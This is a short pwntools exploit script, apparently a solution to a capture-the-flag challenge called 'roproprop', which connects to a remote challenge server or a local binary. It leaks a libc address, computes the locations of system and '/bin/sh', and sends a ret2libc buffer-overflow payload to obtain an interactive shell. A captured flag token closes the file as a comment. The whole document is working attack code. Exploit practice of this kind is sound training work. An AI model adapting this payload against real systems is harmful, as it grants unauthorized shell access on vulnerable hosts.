#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./roproprop"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 6003

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

start()

p.recvuntil("- ")
address = int(p.recvuntil(" -", drop=True), 16)

if args.REMOTE:
    base   = address - 0x65ff0
    system = base    + 0x3ada0
    bin_sh = base    + 0x15ba0b
else:
    base   = address - 0x06e840
    system = base    + 0x03d250
    bin_sh = base    + 0x17e3cf

# Just a simple buffer-overflow ROP, fill up the buffer with characters so that you can overwrite the EIP with system('bin/sh')
payload = b"A" * 0x4ce
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendlineafter("?\n", payload)

p.interactive()
p.close()

# Flag = FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1yb3Byb3Byb3AiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6ImE3YThlYjM0LTI4M2YtNDI3NC04YWMxLTVhMmZjNDlhZDMxZiJ9.P93C_w0Q8fOy9qe8JIH7tpA8j1uO6MDJUNAKvbrfOf8}